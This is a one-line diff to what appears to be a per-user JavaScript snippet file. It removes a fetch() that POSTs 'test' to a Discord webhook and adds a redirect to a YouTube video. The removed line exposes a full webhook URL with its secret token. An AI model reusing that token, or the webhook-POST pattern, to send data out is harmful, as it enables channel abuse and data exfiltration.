@@ -1,1 +1,1 @@
-deekie110: fetch("https://discord.com/api/webhooks/1495444228447273122/cOBuvZSRhvR_4G3_ow69cNKoqSgH6e0GWdygirx3p9ERArkLLryFM3e6beCjW7yavlxU",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"test"})});
+k1ck: location.href = "https://www.youtube.com/watch?v=4izTAsXb9WY"
